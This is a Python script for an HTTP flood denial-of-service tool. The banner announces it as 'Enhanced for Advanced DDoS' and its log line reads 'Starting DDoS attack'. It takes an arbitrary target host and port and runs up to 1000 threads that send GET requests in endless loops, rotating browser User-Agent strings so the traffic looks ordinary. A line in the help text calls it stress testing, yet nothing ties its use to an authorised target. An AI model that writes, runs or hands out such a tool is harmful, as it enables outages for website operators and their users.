#!/usr/bin/env python3
import argparse
import logging
import random
import threading
import sys
import requests
import time  # Import added here
from requests.exceptions import RequestException, Timeout
from queue import Queue
from collections import defaultdict

print(r"""
███████╗ ██████╗ ███████╗████████╗███████╗██████╗
██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
█████╗  ██║   ██║███████╗   ██║   █████╗  ██████╔╝
██╔══╝  ██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
Created by LUCIFER and GhostAxe - Enhanced for Advanced DDoS
""")

# Argument Parser
parser = argparse.ArgumentParser(description="Distributed HTTP attack tool for stress testing websites")
parser.add_argument("target", help="Target URL or host")
parser.add_argument("-p", "--port", default=80, type=int, help="Target port (default: 80)")
parser.add_argument("-t", "--threads", default=100, type=int, help="Number of threads (default: 100, max: 1000)")
parser.add_argument("--https", action="store_true", help="Use HTTPS for requests")
parser.set_defaults(https=False)
args = parser.parse_args()

# Limit threads
if args.threads > 1000:
    logging.warning("Too many threads requested. Limiting to 1000.")
    args.threads = 1000

logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

# User-Agent List
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
]

# Request Statistics
stats = defaultdict(int)
stats_lock = threading.Lock()

def log_stats():
    """Log request statistics periodically."""
    while True:
        with stats_lock:
            logging.info(f"Success: {stats['success']} | Failed: {stats['failed']} | Timeout: {stats['timeout']}")
        time.sleep(5)  # Ensure 'time' is imported

def send_request(url, headers=None):
    """
    Sends a single HTTP GET request.
    """
    headers = headers or {}
    headers["User-Agent"] = random.choice(user_agents)
    try:
        response = requests.get(url, headers=headers, timeout=10)
        with stats_lock:
            if response.ok:
                stats['success'] += 1
            else:
                stats['failed'] += 1
        logging.info(f"Request sent to {url} - Status: {response.status_code}")
    except Timeout:
        with stats_lock:
            stats['timeout'] += 1
        logging.warning(f"Request timed out for {url}")
    except RequestException as e:
        with stats_lock:
            stats['failed'] += 1
        logging.warning(f"Error: {e}")

def worker(target, headers):
    """
    Worker thread function to handle requests.
    """
    while True:
        send_request(target, headers)

def attack(target, threads):
    """
    Initiates the attack with the specified parameters.
    """
    logging.info("Starting DDoS attack...")
    headers = {}

    threading.Thread(target=log_stats, daemon=True).start()

    for _ in range(threads):
        threading.Thread(target=worker, args=(target, headers)).start()

if __name__ == "__main__":
    target = f"http{'s' if args.https else ''}://{args.target}:{args.port}"
    attack(target, args.threads)

